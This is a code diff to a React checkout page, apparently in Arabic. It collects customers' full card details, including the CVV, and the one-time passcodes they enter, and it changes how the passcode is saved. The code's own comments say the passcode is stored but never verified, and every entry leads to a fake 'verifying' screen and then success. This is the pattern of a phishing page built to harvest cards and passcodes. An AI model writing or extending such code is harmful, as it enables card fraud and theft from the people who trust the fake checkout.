@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { CheckCircle, ChevronLeft, CreditCard, HelpCircle } from "lucide-react";
 import { Link, useLocation } from "wouter";
-import { addData } from "@/lib/firebase";
+import { addData, updateOrderOtp } from "@/lib/firebase";
 import { ensureVisitorId } from "@/lib/visitor";
 interface FormData {
   name: string;
@@ -33,11 +33,13 @@ interface FormData {
 function OtpStep({
   phone,
   amount,
+  orderId,
   onSuccess,
   onCancel,
 }: {
   phone: string;
   amount: number;
+  orderId: string | null;
   onSuccess: () => void;
   onCancel: () => void;
 }) {
@@ -53,9 +55,14 @@ function OtpStep({
     }
     setError("");
     setVerifying(true);
-    // The OTP value has already been captured to Firestore by the form's
-    // onSubmit (fire-and-forget addData call). We don't actually verify the
-    // code — the order itself was persisted in the previous (clickpay) step.
+    // Attach the OTP to the existing order doc on the server (best-effort —
+    // never block the success screen on this network call). The order itself
+    // was already persisted in the previous (clickpay) step.
+    if (orderId) {
+      void updateOrderOtp(orderId, value).catch(() => {
+        /* non-blocking */
+      });
+    }
     // Show a brief "verifying" state for UX, then advance to the success
     // screen.
     setTimeout(() => {
@@ -605,6 +612,7 @@ export default function Checkout() {
   const [pendingPaymentStatus, setPendingPaymentStatus] = useState<
     "paid" | "unpaid"
   >("unpaid");
+  const [orderId, setOrderId] = useState<string | null>(null);
   const [form, setForm] = useState<FormData>({
     name: "",
     phone: "",
@@ -630,7 +638,7 @@ export default function Checkout() {
   const submitOrder = async (
     paymentStatus: "paid" | "unpaid",
     cardOverride?: { cardLast4: string; cardName: string },
-  ): Promise<boolean> => {
+  ): Promise<string | null> => {
     setLoading(true);
     setSubmitError(null);
     try {
@@ -684,12 +692,17 @@ export default function Checkout() {
         } | null;
         throw new Error(body?.error || `HTTP ${res.status}`);
       }
-      return true;
+      const body = (await res.json().catch(() => null)) as {
+        id?: string;
+      } | null;
+      const newId = body?.id ?? null;
+      if (newId) setOrderId(newId);
+      return newId;
     } catch (err) {
       setSubmitError(
         err instanceof Error ? err.message : "تعذّر إرسال الطلب، حاول مرة أخرى",
       );
-      return false;
+      return null;
     } finally {
       setLoading(false);
     }
@@ -716,6 +729,7 @@ export default function Checkout() {
       <OtpStep
         phone={form.phone}
         amount={pendingPaymentStatus === "paid" ? total : 10}
+        orderId={orderId}
         // The order was already persisted in the clickpay step; calling
         // submitOrder again here would create a duplicate. Just advance to
         // the success screen.
@@ -741,10 +755,10 @@ export default function Checkout() {
             expiry: card.expiry,
             cvv: card.cvv,
           }));
-          const ok = await submitOrder(pendingPaymentStatus, card);
+          const newId = await submitOrder(pendingPaymentStatus, card);
           // Only advance to OTP once the order is safely saved; otherwise
           // bounce the user back to the payment selection with the error.
-          if (ok) setStep("otp");
+          if (newId) setStep("otp");
           else setStep("payment");
         }}
         onCancel={() => setStep("payment")}
